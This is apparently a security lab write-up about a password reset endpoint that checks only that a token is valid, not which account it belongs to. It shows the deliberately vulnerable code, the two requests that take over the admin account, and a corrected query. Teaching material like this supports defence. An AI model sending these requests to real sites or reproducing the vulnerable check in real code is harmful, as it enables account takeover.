Password Reset With Broken Token-to-User Binding

This lab looks like a normal reset flow, but the final reset step trusts the username coming from the form instead of deriving the target account from the token itself.

Quick reminder

A reset token should only work for the account it was issued for. If the server validates only the token and not the token-to-user relationship, an attacker can request a token for one account and use it to reset another one.

Where the vulnerability comes from

The token is stored with a username, but the reset query checks only whether the token exists and is still active.

if request.method == 'POST':
    token = request.form['token']
    username = request.form['username']
    new_password = request.form['new_password']

    reset = conn.execute(
        "SELECT * FROM reset_tokens WHERE token=? AND expired=0",
        (token,)
    ).fetchone()

    if reset:
        conn.execute(
            "UPDATE users SET password=? WHERE username=?",
            (new_password, username)
        )
<input type="text" name="username" value="{{ username }}">

How the exploit works

Request a reset for your own account, get a valid token from your mailbox, then change the username field before submitting the new password.

Request a reset token

POST /forgot-password
username=user

Use the token against another account

POST /reset-password
token=<valid-user-token>
username=admin
new_password=hacked123

The token is valid, so the app accepts it. The update then applies to admin because the server trusts the form field.

Fix

Bind the token lookup to the username, or better, derive the username only from the token.

# safer query
reset = conn.execute(
    "SELECT * FROM reset_tokens WHERE token=? AND username=? AND expired=0",
    (token, username)
).fetchone()
# even better: ignore the submitted username entirely
if reset:
    conn.execute(
        "UPDATE users SET password=? WHERE username=?",
        (new_password, reset['username'])
    )
